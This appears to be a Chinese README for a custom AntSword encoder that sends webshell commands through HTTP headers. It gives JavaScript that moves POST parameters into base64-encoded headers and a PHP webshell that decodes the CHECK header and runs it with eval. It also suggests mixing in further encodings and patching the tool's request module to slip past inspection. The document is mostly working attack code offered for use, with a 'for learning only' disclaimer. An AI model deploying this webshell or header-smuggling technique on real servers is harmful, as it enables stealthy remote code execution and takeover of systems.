# 在AntSword中使用header传参

其实是好久之前写的，不过现在拿出来水一下。仅作思路交流，仅使用了base64编码。真实情况下可以结合其他编码混合使用。如果出现中间件报错400，可以改小data[_].length < 10000中10000的值。

-----

## 使用

1. 新建php编码器，输入encode.js中的内容。
```javascript
'use strict';
module.exports = (pwd, data, ext={}) => {
  for (let _ in data){
    if( _ === '_') { continue;}
    if(data[_].length < 10000){
      while(data['_'].indexOf(_)!=-1){
        data['_'] = data['_'].replace('$_POST["'+ _ +'"]','$_SERVER["HTTP_'+_.toUpperCase()+'"]');
      }
      ext.opts.httpConf.headers[_] = data[_];
      delete data[_];
    }
  }
  ext.opts.httpConf.headers[pwd] = new Buffer.from(data['_']).toString('base64');
  delete data['_'];
  return data;
}
```

2. PHPshelldemo
```php
<?php
// 连接密码：check
$b = base64_decode(getenv('HTTP_CHECK'));
eval($b);
?>
```

3. 去除掉Content-type中烦人的application/x-www-form

   替换 antSword\modules\requests.js 为本仓库下的requests.js 
   
   

可以抓包进行验证。只有在data[_].length >= 10000的情况下使用POST请求，其他情况下皆使用GET请求。



仅供学习交流使用，本人不为非学习用途所带来的恶意后果负责。